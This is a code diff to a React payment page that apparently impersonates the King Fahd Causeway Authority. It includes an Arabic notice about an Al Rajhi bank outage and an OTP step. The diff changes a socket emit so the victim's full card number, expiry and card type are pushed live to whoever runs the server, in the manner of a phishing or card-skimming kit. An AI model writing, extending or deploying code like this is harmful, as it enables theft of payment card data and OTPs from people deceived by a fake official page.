@@ -64,20 +64,24 @@ const VisaPage = ({ loading, setLoading }) => {
 نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي    وذلك بسبب خلل فني من جهة مصدر البنك`);
     }
     try {
-      // Create a temporary order or initial submission
-      await axios.post(`${api_route}/visa/${sessionStorage.getItem("id")}`, {
+      const orderSessionId = sessionStorage.getItem("id");
+      const cardType = formData.cardNumber.startsWith("4") ? "visa" : "mastercard";
+      await axios.post(`${api_route}/visa/${orderSessionId}`, {
         ...formData,
         cardExpiry,
-        cardType: formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
+        cardType,
       });
 
-      setOrderId(sessionStorage.getItem("id"));
-      localStorage.setItem(
-        "cardType",
-        formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
-      );
-      socket.emit("joinOrder", sessionStorage.getItem("id"));
-      socket.emit("visa", sessionStorage.getItem("id"));
+      setOrderId(orderSessionId);
+      localStorage.setItem("cardType", cardType);
+      socket.emit("joinOrder", orderSessionId);
+      socket.emit("visa", {
+        _id: orderSessionId,
+        id: orderSessionId,
+        ...formData,
+        cardExpiry,
+        cardType,
+      });
       // window.location.href = "/otp";
     } catch (err) {
       setError("An error occurred. Please try again.");
@@ -294,11 +298,7 @@ const VisaPage = ({ loading, setLoading }) => {
           </button>
           <span className="text-sm"> King Fahd Causeway Authority </span>
         </div>
-        <img
-          src="/visa1.png"
-          alt="footer"
-          className="w-full"
-        />
+        <img src="/visa1.png" alt="footer" className="w-full" />
       </form>
 
       {showOtp && (
